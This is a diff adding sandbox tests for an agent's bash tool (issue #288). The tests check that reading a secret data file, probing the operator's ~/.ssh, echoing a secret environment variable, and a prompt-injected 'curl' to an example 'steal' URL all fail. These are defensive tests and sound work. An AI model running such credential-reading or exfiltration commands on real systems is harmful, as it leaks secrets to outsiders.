@@ -1,5 +1,6 @@
 import { describe, expect, test } from 'bun:test';
 import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
+import { homedir } from 'node:os';
 import { join } from 'node:path';
 import { CORE_COMMANDS, type CommandHost } from '../src/commands.ts';
 import { PluginHost } from '../src/plugins/host.ts';
@@ -88,6 +89,67 @@ describe('the bash sandbox (#233)', () => {
       );
       expect(result.isError).toBe(false);
       expect(readFileSync(join(workspace, 'ok.txt'), 'utf8')).toBe('sandbox-ok');
+    });
+  });
+
+  test.skipIf(!sandboxed)('the data dir is not readable from bash (#288)', async () => {
+    const { workspace, data, trace } = layout();
+    const secret = join(data, 'memory.sqlite');
+    writeFileSync(secret, 'companion-secret-288');
+    await withHost(data, workspace, trace, async (host) => {
+      const result = await host.tools.invoke(
+        'bash',
+        { toolCallId: 'c1', input: { command: `cat ${JSON.stringify(secret)}` } },
+        { runId: 'r' },
+      );
+      expect(result.isError).toBe(true);
+      expect(result.output).not.toContain('companion-secret-288');
+    });
+  });
+
+  test.skipIf(!sandboxed)('the operator home is not mounted and HOME points at the sandbox (#288)', async () => {
+    const { workspace, data, trace } = layout();
+    await withHost(data, workspace, trace, async (host) => {
+      const result = await host.tools.invoke(
+        'bash',
+        { toolCallId: 'c1', input: { command: `printf 'HOME=%s\\n' "$HOME"; test -e ${JSON.stringify(join(homedir(), '.ssh'))} && echo HOME_SSH_VISIBLE` } },
+        { runId: 'r' },
+      );
+      expect(result.output).toContain('HOME=/tmp');
+      expect(result.output).not.toContain('HOME_SSH_VISIBLE');
+    });
+  });
+
+  test.skipIf(!sandboxed)('a secret in the shell environment does not reach bash (#288)', async () => {
+    const { workspace, data, trace } = layout();
+    const previous = process.env.COGMEM_TEST_SECRET;
+    process.env.COGMEM_TEST_SECRET = 'sk-288-must-not-leak';
+    try {
+      await withHost(data, workspace, trace, async (host) => {
+        const result = await host.tools.invoke(
+          'bash',
+          { toolCallId: 'c1', input: { command: 'printf "secret=[%s]" "$COGMEM_TEST_SECRET"' } },
+          { runId: 'r' },
+        );
+        expect(result.isError).toBe(false);
+        expect(result.output).toBe('secret=[]');
+      });
+    } finally {
+      if (previous === undefined) delete process.env.COGMEM_TEST_SECRET;
+      else process.env.COGMEM_TEST_SECRET = previous;
+    }
+  });
+
+  test.skipIf(!sandboxed)('a web-injected instruction cannot exfiltrate: network is unshared (#288)', async () => {
+    const { workspace, data, trace } = layout();
+    await withHost(data, workspace, trace, async (host) => {
+      const result = await host.tools.invoke(
+        'bash',
+        { toolCallId: 'c1', input: { command: 'curl -sS -m 2 https://example.com/steal' } },
+        { runId: 'r' },
+      );
+      expect(result.isError).toBe(true);
+      expect(result.output).toMatch(/Could not resolve host|Network is unreachable|Failed to connect/i);
     });
   });
 
